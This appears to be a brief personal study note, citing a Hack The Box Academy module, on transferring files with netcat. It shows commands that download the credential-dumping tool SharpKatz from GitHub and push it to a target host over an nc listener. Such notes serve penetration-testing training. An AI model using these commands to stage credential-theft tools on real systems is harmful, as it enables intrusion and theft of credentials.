netcat
########

Date: 2024-11-03 16:26

Status:

Usage
******

Here is an example of transferring a file using Netcat(nc)

On the target run a server that will receive input and write it to the
file we are transferring.

.. code:: powershell

   target:~$ nc -l -p 8000 --recv-only > SharpKatz.exe

Then on your pwnbox transfer the file as so:

Step 1. Get a copy of the attack file:

.. code-block:: console

    wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

And then send it to the target:

.. code-block:: console

   nc --send-only  192.168.49.128 8000  < SharpKatz.exe

References
*****************
`Hack the box <https://academy.hackthebox.com/module/24/section/161>`__
